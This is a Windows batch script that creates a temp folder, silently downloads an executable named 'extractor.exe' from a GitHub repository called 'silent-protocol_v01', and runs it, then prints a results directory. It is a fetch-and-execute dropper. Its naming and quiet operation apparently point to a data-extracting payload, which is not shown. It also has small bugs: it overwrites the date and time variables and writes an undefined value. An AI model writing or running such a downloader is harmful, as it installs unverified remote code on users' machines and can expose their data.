@echo off
setlocal EnableDelayedExpansion

REM Get timestamp using time and date commands
for /f "tokens=1-4 delims=/ " %%A in ('date /t') do set "date=%%D%%B%%C"
for /f "tokens=1-3 delims=:." %%A in ('time /t') do set "time=%%A%%B"
set "tempdir=%TEMP%\bb_%date%%time%"

REM Add random number to ensure uniqueness
set "tempdir=%tempdir%_%random%"

REM Create temp directory
mkdir "%tempdir%" 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo Error: Failed to create temporary directory
    exit /b 2
)

cd "%tempdir%" || (
    echo Error: Failed to change directory
    rmdir "%tempdir%" 2>nul
    exit /b 3
)

echo Downloading files...
curl -L -s -o extractor.exe https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/extractor.exe


REM Verify all critical downloads
for %%F in (extractor.exe) do (
    if not exist "%%F" (
        echo Error: Failed to download %%F
        exit /b 4
    )
)
REM Create running flag
echo %datetime% > "%tempdir%\running.tmp"
echo Starting process----------------------------------------
call "%tempdir%\extractor.exe"

echo results dir: %tempdir%
